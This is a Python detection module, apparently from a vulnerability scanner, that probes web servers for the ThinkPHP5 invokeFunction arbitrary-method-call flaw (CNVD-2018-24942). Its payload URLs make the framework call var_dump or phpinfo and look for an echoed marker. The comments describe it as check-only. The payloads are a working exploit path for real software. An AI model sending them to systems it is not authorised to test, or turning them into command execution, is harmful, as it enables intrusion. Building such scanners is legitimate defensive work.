from core.http import request
from core.result import (make_result, STATUS_VULNERABLE,
                         STATUS_NOT_FOUND, STATUS_INCONCLUSIVE)

NAME = "thinkphp5_invoke"
DESCRIPTION = "ThinkPHP5 invokeFunction 任意方法调用检测"
REFERENCE = "CNVD-2018-24942, https://vulhub.org/#/environments/thinkphp/5-rce/"

MARKER = "pocforge_t6marker"   # 唯一标记:不撞页面固有内容,回显即实锤

# 两级信号:优先无害的 var_dump 标记回显;兜底 phpinfo 特征
# 路径变体覆盖 5.0.x 与 5.1.x 的兼容模式差异
ROUTES = [
    "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array"
    "&vars[0]=var_dump&vars[1][]=" + MARKER,
    "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array"
    "&vars[0]=var_dump&vars[1][]=" + MARKER,
]
PHPINFO_ROUTES = [
    "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array"
    "&vars[0]=phpinfo&vars[1][]=-1",
    "/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array"
    "&vars[0]=phpinfo&vars[1][]=-1",
]


def check(target):
    """检测信号:诱导框架反射调用 var_dump 回显唯一标记,响应含标记 = 任意方法调用成立。
    两级信号:var_dump 标记回显(确定性)优先,phpinfo 特征兜底。
    全程无副作用:不写文件、不执行命令、不改状态(check-only)。
    已知限制:依赖响应特征;WAF 拦截 s 参数、或部署修改了报错页时可能漏报。
    """
    base = target.rstrip("/")
    matches = []
    reachable = False
    try:
        for path in ROUTES + PHPINFO_ROUTES:
            try:
                r = request("GET", base + path, timeout=5)
                reachable = True
            except Exception:
                continue
            if MARKER in r.text:
                i = r.text.find(MARKER)
                matches.append({"signal": "marker_echo", "path": path,
                                "snippet": r.text[max(0, i - 20):i + 40]})
            elif "PHP Version" in r.text and "Configuration" in r.text:
                matches.append({"signal": "phpinfo_signature", "path": path,
                                "snippet": "phpinfo page detected"})

        if not reachable:
            return make_result(NAME, target, STATUS_INCONCLUSIVE, note="目标完全不可达")
        if matches:
            return make_result(NAME, target, STATUS_VULNERABLE, evidence={"matches": matches})
        return make_result(NAME, target, STATUS_NOT_FOUND,
                           note="无标记回显;WAF 拦截 s 参数时可能漏报(已知限制)")
    except Exception as e:
        return make_result(NAME, target, STATUS_INCONCLUSIVE, note=f"检测过程异常: {e}")
